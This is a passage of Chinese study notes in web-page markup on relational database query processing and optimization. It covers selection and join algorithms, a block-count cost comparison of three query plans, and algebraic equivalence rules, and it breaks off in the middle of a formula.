href="#六查询处理与查询优化">#</a> 六，查询处理与查询优化</h1><h2 id="查询处理"><a class="markdownIt-Anchor" href="#查询处理">#</a> 查询处理</h2><p>【定义】 查询处理是关系数据库管理系统执行查询语句的过程，其任务是吧用户提交给关系数据库管理系统的查询语句转化为更为高效的<strong>查询执行计划。</strong></p><h3 id="一查询处理步骤"><a class="markdownIt-Anchor" href="#一查询处理步骤">#</a> 一，查询处理步骤</h3><p>关系数据库管理系统查询处理可以分为 4 个阶段：</p><ul><li>查询分析</li><li>查询检查</li><li>查询优化</li><li>查询执行<br><img src="https://img-blog.csdnimg.cn/fb5e2957811b40b0bbdb537203e98efa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="查询处理步骤"><br><strong>（1）查询分析</strong><br>任务：<strong>对查询语句进行扫描，分析词法、语法是否符合 SQL 语法规则</strong></li><li>如果没有语法错误转入下一步</li><li>如果有语法错误则在报告中显示错误<br><strong>（2）查询检查</strong><br>任务：</li><li>对合法的查询语句进行<strong>语义检查</strong>，即根据数据字典中有关的模式定义检查语句中的数据库对象，如<strong>关系名、属性名是否存在和有效</strong></li><li>如果是对视图的操作，则要用<strong>视图消解方法</strong>把对视图的操作转换成对基本表的操作</li><li>还要对<strong>权限</strong>、<strong>完整性约束</strong>进行检查，如果违反则拒绝查询</li><li>检查通过后，<strong>把 SQL 查询语句转化为内部表示，也即等价的关系代数表达式</strong></li><li>在此过程中，<strong>要把数据库对象的外部名称换为内部表示</strong></li><li>RDBMS 一般用<strong>查询树</strong>（又称为<strong>语法分析树</strong>）来表示扩展的关系代数表达式<br><strong>（3）查询优化</strong><br>任务：<strong>每个查询都会有许多可供选择的执行策略和操作算法，查询优化就是选择一个高效执行的查询处理策略。按照优化的层次一般可以将查询优化分为</strong></li><li><strong>代数优化</strong>：是指<strong>关系代数表达式</strong>的优化，也即按照一定规则，通过对关系代数表达式进行<strong>等价变换</strong>，改变代数表达式中操作的<strong>次序和组合</strong>，使查询更高效</li><li><strong>物理优化</strong>：是指<strong>存取路径</strong>和<strong>底层操作算法</strong>的选择。选择依据可以是<strong>基于规则的 (rule based)</strong>、<strong>基于代价的 (cost based)、基于语义的 (semantic based)</strong><br><strong>（4）查询执行</strong><br>依据优化器得到的执行策略生成查询执行计划，由 <strong>代码生成器 (code generator)</strong> 生成执行这个查询计划的代码，然后加以执行，回送查询结果。</li></ul><h3 id="二实现查询操作的算法实例"><a class="markdownIt-Anchor" href="#二实现查询操作的算法实例">#</a> 二，实现查询操作的算法实例</h3><h4 id="1选择操作的实现"><a class="markdownIt-Anchor" href="#1选择操作的实现">#</a> （1）选择操作的实现</h4><p>以简单的单表为例，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT* FROM STUDENT WHERE&lt;条件表达式&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;条件表达式&gt;</code>  可以有以下几种情况:</p><ul><li>case1：无条件</li><li>case2: Sno = ‘20214132’</li><li>case3: Sage &gt; 20</li><li>case4 Sdept = ‘CS’ AND Sage &gt; 20<br> 选择操作只涉及一个关系，典型的实现方法有：</li></ul><h6 id="1全表扫描"><a class="markdownIt-Anchor" href="#1全表扫描">#</a> ①全表扫描</h6><p>思想：假设可以使用的内存块为 M 块</p><ul><li>按照物理次序读取 <code>Student</code>  的 M 块到内存</li><li>检查内存的每个元组 t，如果 t 满足选择条件，则输出 t</li><li>如果 <code>Student</code>  还有其他块未被处理，重复即可<br><strong>优缺点：</strong></li><li>优点：只需要很少的内存（最少为 1 块）就可以运行，且控制简单。适用于规模较小的表</li><li>缺点：对于规模大的表进行顺序扫描，当选择率低的时候会使效率很低</li></ul><h5 id="2索引扫描"><a class="markdownIt-Anchor" href="#2索引扫描">#</a> ②索引扫描</h5><p>思想：如果<strong>选择条件的属性上有索引（B + 树或者 hash 索引），可以用索引扫描。通过索引先找到满足条件的元组指针，再通过元组指针在查询的基本表中找到元组。</strong></p><ul><li>以 case2 为例：Sno = '20214132’并且 Sno 上有索引，则可以使用索引得到 Sno 为 \20214132 元组的指针，然后通过元组指针在 Student 表中检索到该学生</li><li>以 case3 为例：Sage&gt;20，并且 Sage 上有 B + 树索引，则可以使用 B + 树索引找到 Sage=20 的索引项，以此为入口点在 B + 树的顺序集上得到 Sage&gt;20 的所有元组指针，然后通过这些元组指针到 <code>Student</code>  表对中检索到所有年龄大于 20 的学生。</li><li>以 case4 为例：Sdept = ‘CS’ AND Sage &gt; 20，如果 <code>Sdept</code>  和 <code>Sage</code>  上都有索引，<strong>一种算法是</strong>：分别用上面的两种方法找到 AND 左右的两个句子，取两组指针的交际，再到 Student 表中检索，就得到计算机系年龄大于 20 的学生</li></ul><h4 id="2连接操作的实现"><a class="markdownIt-Anchor" href="#2连接操作的实现">#</a> （2）连接操作的实现</h4><p><strong>连接操作是查询处理中最常用也是最耗时的操作之一</strong> 。不失一般性，这里通过例子简单介绍 <strong>等值连接 (或自然连接)</strong> 最常用的几种算法思想</p><h5 id="1嵌套循环方法nested-loop"><a class="markdownIt-Anchor" href="#1嵌套循环方法nested-loop">#</a> ①：嵌套循环方法（nested loop）</h5><p><strong>思想：对外层循环 ( <code>Student</code>  表) 的每一个元组，检索内层循环 ( <code>SC</code>  表) 中的每一个元组，并检查这两个元组在连接属性 ( <code>Sno</code> ) 上是否相等。如果满足连接条件，则串接后作为结果输出，直到外层循环表中的元组处理完为止</strong></p><h5 id="2排序-合并方法sort-merge-join"><a class="markdownIt-Anchor" href="#2排序-合并方法sort-merge-join">#</a> ②：排序 - 合并方法（sort-merge join）</h5><ol><li>如果参与连接的表没有排好序，首先对 <code>Student</code>  表和 <code>SC</code>  表按连接属性 <code>Sno</code> <strong> 排序</strong></li><li>取 Student 表中第一个  <code>Sno</code> ,<strong> 依次扫描</strong> <code>SC</code>  表中具有相同 <code>Sno</code>  的元组，把它们连接起来</li><li>当扫描到 <code>Sno</code> <strong> 不相同的第 一个 SC 元组</strong>时，返回 <code>Student</code>  表扫描它的下一 个元组，再扫描 <code>SC</code>  表中具有相同 <code>Sno</code>  的元组，把它们连接起来<br><strong>重复上述步骤直至 <code>Student</code>  扫描完毕</strong></li></ol><h5 id="3索引连接index-join"><a class="markdownIt-Anchor" href="#3索引连接index-join">#</a> ③：索引连接（index join）</h5><p><strong>思想：</strong></p><ul><li>在 <code>SC</code>  表上已经建立了属性 <code>Sno</code>  的<strong>索引</strong></li><li>对 <code>Student</code>  中每一个元组，由 <code>Sno</code>  值通过 <code>SC</code>  的索引查找相应的 <code>SC</code>  元组</li><li>把这些 <code>SC</code>  元组和 <code>Student</code>  元组连接起来<br><strong>循环执行第二步和第三步，直至 <code>Student</code>  中的元组处理完毕</strong></li></ul><h5 id="4哈希连接hash-join"><a class="markdownIt-Anchor" href="#4哈希连接hash-join">#</a> ④：哈希连接（hash join）</h5><p><strong>思想：它把连接属性作为 hash 码，用同一个 hash 函数把 <code>Student</code>  表和 <code>SC</code>  表中的元组散列到 hash 表中</strong></p><ul><li><strong>划分阶段（创建阶段）</strong>：即创建 hash 表。对包含较少元组的表 ( 如 <code>Student</code>  表) 进行一遍处理，把它的元组按 hash 函数 (hash 码是连接属性) 分散到 hash 表的桶中</li><li><strong>试探阶段（连接阶段）</strong>：对另一个表 ( <code>SC</code>  表) 进行一遍处理，把 <code>SC</code>  表的元组也按同一个 hash 函数 (hash 码是连接属性) 进行散列，找到适当的 hash 桶，并把 <code>SC</code>  元组与桶中来自 <code>Student</code>  表并与之相匹配的元组连接起来。</li></ul><h2 id="查询优化"><a class="markdownIt-Anchor" href="#查询优化">#</a> 查询优化</h2><h3 id="一查询优化概述"><a class="markdownIt-Anchor" href="#一查询优化概述">#</a> 一，查询优化概述</h3><p><strong>（1）查询优化的地位和重要性</strong><br>关系系统的查询优化既是关系<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&amp;spm=1001.2101.3001.7020">数据库管理系统</a>实现的<strong>关键技术</strong>，又是关系系统的<strong>优点所在</strong>。<br>在非关系系统中，<strong>用户必须了解存取路径，系统提供用户选择存取路径的手段，查询的效率由用户的存取策略决定，且系统是无法加以优化的。这就要求用户需要具有较高的数据库技术和程序设计水平</strong><br><strong>查询优化的优点不仅在于用户不必考虑如何最好地表达查询以获得较高的效率，而且在于系统可以比用户程序的 “优化” 做得更好</strong>。</p><ul><li>优化器可以从数据字典中获得很多统计信息，但是用户程序难以获得</li><li>即便数据库物理统计信息改变，系统也可以进行优化从而选择相应的执行计划，但是对于非关系系统则必须要重写程序</li><li>优化器可以考虑数百种不同的执行计划，但程序员一般仅能考虑有限的几种可能性</li><li>优化器包含了很多复杂的优化技术，这样就等同于所用的使用者间接拥有了这些技术<br><strong>（2）执行代价</strong><br>目前关系数据库管理系统通过某种代价模型计算出各种查询执行策略的执行代价，然后选取<strong>代价最小的执行方案</strong>。一般来说：<strong>总代价 = I/O 代价 + CPU 代价 + 内存代价 + 通信代价</strong></li><li>计算查询代价时一般用<strong>查询处理读写的块数</strong>作为衡量单位</li></ul><h3 id="二一个例子"><a class="markdownIt-Anchor" href="#二一个例子">#</a> 二，一个例子</h3><p>可以通过 “<strong>求选修了 2 号课程的学生姓名</strong>” 这样一个例子来说明为什么要进行查询优化<br>以下是一些<strong>系统假设</strong></p><ul><li>假定学生 - 课程数据库中有<strong> 1 000 个学生记录，10 000 个选课记录（平均每一个学生了选了 10 门课），其中选修 2 号课程的选课记录为 50 个</strong></li><li>有<strong> 7 个内存块</strong>（其中<strong>分配 5 块用于装入 <code>Student</code>  表，1 块用于装入 <code>SC</code>  表，1 块用于装入中间结果</strong>）</li><li>其中<strong>一块可以装入 10 个 <code>student</code>  元组</strong>（或 10 个 <code>student</code>  与 SC<a href="https://so.csdn.net/so/search?q=%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF&amp;spm=1001.2101.3001.7020"> 笛卡尔积</a>元组）；一块也可以 <strong>装入 50 个 SC 元组</strong>（因为 SC 的列数较少）</li><li>连接方法为：<strong>基于数据块的嵌套循环法。</strong></li><li><strong>之所以这样分配的原因</strong>：因为嵌套循环算法需要选用占用内存少的表作为外表，student 表有 1000 行，每块装 10 行，所以需要 100 块；SC 表有 10000 行，每块装 50 行，所以需要 200 块。</li><li>由于 student 表需要 100 个内存块，而分配给它的只有 5 个，所以不可能一次全部装入内存，每次只能装入一部分，比较完了再装入另外一部分。每换一批数据，内标就需要全部重新装入以便，所以为了减少内表循环装入的次数，就必须尽可能的分配内存给外表</li><li>连接后的元组<strong>装满一块</strong>后就写到中间文件上</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Student.name</span><br><span class="line">FROM Student,SC</span><br><span class="line">WHERE Student.Sno=SC.Sno AND SC.Cno=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><p>系统可以用多种等价的<strong>关系代数表达式</strong>来完成这一查询，这里只举三种情况</p><h4 id="1情况1"><a class="markdownIt-Anchor" href="#1情况1">#</a> （1）情况 1</h4><p><code>Student</code>  与 <code>Sc</code>  作<strong>笛卡尔积</strong>，而后作<strong>行选择</strong>运算（选择条件为 <code>Student.Sno=SC.Sno AND SC.Cno='2'</code> ），最后进行<strong>投影操作</strong><br><strong>①：计算广义笛卡尔积</strong><br>操作：</p><ul><li>在内存中尽可能多地装入某个表 (如 <code>Student</code>  表) 的若干块，<strong>留出一块存放另一个表 (如 <code>SC</code>  表) 的元组</strong>；</li><li>然后把 <code>SC</code>  中的每个元组和 <code>Student</code>  中每个元组<strong>连接</strong>，连接后的元组<strong>装满一块后就写到中间文件上</strong>，再从 <code>SC</code>  中读入一块和内存中的 <code>Student</code>  元组连接，直到 <code>SC</code>  表处理完；</li><li>这时再一次读入若干块 <code>Student</code>  元组，读入一块 <code>SC</code>  元组，重复上述处理过程，直到把 <code>Student</code>  表处理完<br>块数：</li><li>读一遍 <code>Student</code>  表所需块数为 = 1000/10 = 100 块</li><li>读一遍 <code>SC</code>  表所需要块数为 = 10000/50 = 200 块</li><li>由于 <code>Student</code>  表可用块数为 5 块，所以分 100/5 = 20 次读入</li><li>同时， <code>Student</code>  表的每一部分读入内存时， <code>SC</code>  表都需要重新读一遍，以此完成与 <code>Student</code>  表的连接。所以需要读入 200×20=4000 块</li><li><strong>所以笛卡尔积读取总块数为 100+4000=4100 块</strong></li><li>Student 表和 SC 表做笛卡尔积共 10<sup>7 行，每块装 10 行，所以中间结果块数 10</sup>6 块（写入）<br><strong>②作选择操作</strong><br>块数：</li><li><strong>所读块数为</strong> 10^6 块</li><li>选择后的结果只有 50 个<br><strong>③作投影操作</strong></li><li>无需读写<br><strong>情况 1 读取总块数</strong>：<br><strong>4100（读）+10<sup>6（写）+10</sup>6（读）。约为 200 万块</strong></li></ul><h4 id="2情况2"><a class="markdownIt-Anchor" href="#2情况2">#</a> （2）情况 2</h4><p><code>Student</code>  与 <code>Sc</code>  作<strong>自然连接</strong>，而后作<strong>行选择</strong>运算（选择条件为 <code>Student.Sno=SC.Sno AND SC.Cno='2'</code> ），最后进行<strong>投影操作</strong><br>①：计算自然连接<br><strong>块数</strong>：</p><ul><li>首先读 <code>Student</code>  和 <code>SC</code> ，与情况 1 一致。因此<strong>总块数 = 4100 块</strong></li><li><strong> <code>Student</code>  和 <code>SC</code>  自然连接后右 10000 行，所以</strong>中间结果块数 **  10000/10 = 1000 块<br>②选择操作</li><li>读入中间结果，<strong>块数 = 1000 块</strong><br>③：作投影操作</li><li>50 个结果可以不用写入<br>情况 2 的总读取块数：<br>4100（读） + 1000（写） + 1000 （读） 共计 6100 块</li></ul><h4 id="3情况3"><a class="markdownIt-Anchor" href="#3情况3">#</a> （3）情况 3</h4><p>首先 <code>Sc</code>  作<strong>行选择</strong>（选择条件为 <code>SC.Cno='2'</code> ），而后作<strong>自然连接</strong>运算，最后进行<strong>投影操作</strong><br><strong>块数</strong>：</p><ul><li>先对 <code>SC</code>  表作<strong>选择操作</strong>，<strong>只需读一遍 <code>SC</code>  表，存取块数为 100 块</strong>，因为满足条件的元组仅 50 个，<strong>不必使用中间文件</strong></li><li>读取 <code>Student</code>  表，把读入的 <code>Student</code>  元组和内存中的 <code>SC</code>  元组作连接。<strong>也只需读一遍 <code>Student</code>  表，共 100 块</strong>，把连接结果投影输出<br>总数：共计 300 块</li></ul><h2 id="查询优化之代数优化"><a class="markdownIt-Anchor" href="#查询优化之代数优化">#</a> 查询优化之代数优化</h2><p>【概念】 <strong>代数优化</strong>是指关系代数表达式的优化，1 即按照一定规则，通过对关系代数表达式进行等价变化，改变代数表达式中操作的次序和组合，使查询更加高效</p><h4 id="关系代数表达式的等价变化规则"><a class="markdownIt-Anchor" href="#关系代数表达式的等价变化规则">#</a> 关系代数表达式的等价变化规则</h4><p><strong>（1）连接，笛卡儿积，并，交的交换律</strong><br>很简单，即上述几种运算都是可交换的，即两个集合进行上述运算，其前后位置可以发生改变。<br><strong>（2）连接，笛卡儿积，并和交的结合律</strong><br>同理，和集合的结合律一样，这里不再阐述。<br><strong>（3）投影的而串接定律</strong><br>关系的两次投影操作可以合并成为一次操作<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{A_1,A_2,...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>B</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{B_1,B_2,...B_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(E)) ≡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∏</mo><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\prod_{A_1,A_2,...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight">.</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span></span></span></span>(E)<br><strong>（4）选择的串接定律</strong><br>选择的两次投影操作可以合并为一次完成<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mn>2</mn></mrow><annotation encoding="application/x-tex">\sigma_F2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">2</span></span></span></span>(E)) ≡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn><mo>∩</mo><mi>F</mi><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1∩F2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span><span class="mbin mtight">∩</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(E)<br><strong>（6）选择与笛卡儿积的交换律</strong><br>① <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) = <span class="katex"><span class="katex-mathml"><math 